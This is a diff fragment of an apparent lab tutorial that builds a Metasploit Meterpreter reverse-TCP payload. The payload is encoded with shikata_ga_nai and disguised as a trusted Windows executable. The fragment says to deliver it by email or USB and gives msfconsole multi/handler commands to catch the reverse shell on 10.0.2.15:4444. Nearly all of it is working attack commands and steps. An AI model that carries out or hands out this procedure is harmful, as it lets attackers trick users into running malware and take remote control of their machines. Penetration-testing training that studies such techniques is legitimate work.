@@ -17,3 +17,14 @@ This disguises payload as a trusted application.
 --arch x86 --format exe \
 --encoding x86/shikata_ga_nai --iterations 500 \
 LHOST=10.0.2.15 LPORT=4444 &gt; windowsMeterpreter.exe”
+Phase 5: Delivering Payload
+9. Payload can be delivered through: Email, USB etc. Use mail id to deliver and access it
+from windows.
+Phase 6: Configuring Listener in Metasploit
+10. Start msfconsole- msfconsole
+11. Use multi handler - use multi/handler
+12. Set payload- set payload windows/meterpreter/reverse_tcp
+13. Set IP and Port-
+set LHOST 10.0.2.15
+set LPORT 4444
+14. Verify settings- show options
